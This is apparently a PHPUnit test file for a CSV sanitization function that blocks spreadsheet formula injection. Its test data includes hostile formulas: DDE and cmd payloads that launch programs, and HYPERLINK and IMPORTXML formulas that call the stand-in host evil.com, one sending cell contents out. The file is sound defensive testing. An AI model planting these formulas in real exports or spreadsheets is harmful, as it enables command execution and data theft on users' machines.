<?php
/**
 * Tests for CSV field sanitization (prevents formula injection)
 */

use PHPUnit\Framework\TestCase;

class CsvSanitizationTest extends TestCase {

    /**
     * @dataProvider formulaInjectionProvider
     */
    public function testSanitizesFormulaInjectionAttempts($input, $expected) {
        $result = sanitize_csv_field($input);
        $this->assertEquals($expected, $result);
    }

    public function formulaInjectionProvider() {
        return [
            // Formula injection attempts - should be prefixed with single quote
            'equals sign formula' => ['=cmd|/C calc.exe!A0', "'=cmd|/C calc.exe!A0"],
            'plus sign formula' => ['+cmd|/C calc.exe!A0', "'+cmd|/C calc.exe!A0"],
            'minus sign formula' => ['-cmd|/C calc.exe!A0', "'-cmd|/C calc.exe!A0"],
            'at sign formula' => ['@SUM(A1:A10)', "'@SUM(A1:A10)"],
            'tab character' => ["\tcmd", "'\tcmd"],
            'carriage return' => ["\rcmd", "'\rcmd"],

            // Real-world Excel formula attacks
            'HYPERLINK attack' => ['=HYPERLINK("http://evil.com?data="&A1,"Click")', "'=HYPERLINK(\"http://evil.com?data=\"&A1,\"Click\")"],
            'DDE attack' => ['=DDE("cmd";"/C calc";"test")', "'=DDE(\"cmd\";\"/C calc\";\"test\")"],
            'IMPORTXML attack' => ['=IMPORTXML("http://evil.com", "//a")', "'=IMPORTXML(\"http://evil.com\", \"//a\")"],

            // Safe values - should NOT be modified
            'normal name' => ['John Doe', 'John Doe'],
            'email' => ['john@example.com', 'john@example.com'],
            'phone number' => ['+1-555-1234', "'+1-555-1234"], // Note: + at start gets prefixed
            'egd number' => ['12345678', '12345678'],
            'empty string' => ['', ''],
            'number' => ['42', '42'],
            'date' => ['2024-01-15', '2024-01-15'],
            'name with hyphen mid-string' => ['Mary-Jane', 'Mary-Jane'],
            'name with equals mid-string' => ['Test=Value', 'Test=Value'],
        ];
    }

    public function testSanitizesNumericValues() {
        // ID field might be numeric
        $this->assertEquals('123', sanitize_csv_field(123));
        $this->assertEquals('0', sanitize_csv_field(0));
    }

    public function testSanitizesNullValues() {
        $this->assertEquals('', sanitize_csv_field(null));
    }

    public function testPhoneNumbersStartingWithPlusArePrefixed() {
        // Phone numbers like +1-555-1234 start with + which is a formula trigger
        // This is expected behavior - the single quote prefix makes it safe
        $result = sanitize_csv_field('+1-555-1234');
        $this->assertEquals("'+1-555-1234", $result);
    }

    public function testNegativeNumbersArePrefixed() {
        // Negative numbers start with - which is a formula trigger
        // This is expected behavior for CSV safety
        $result = sanitize_csv_field('-50');
        $this->assertEquals("'-50", $result);
    }
}
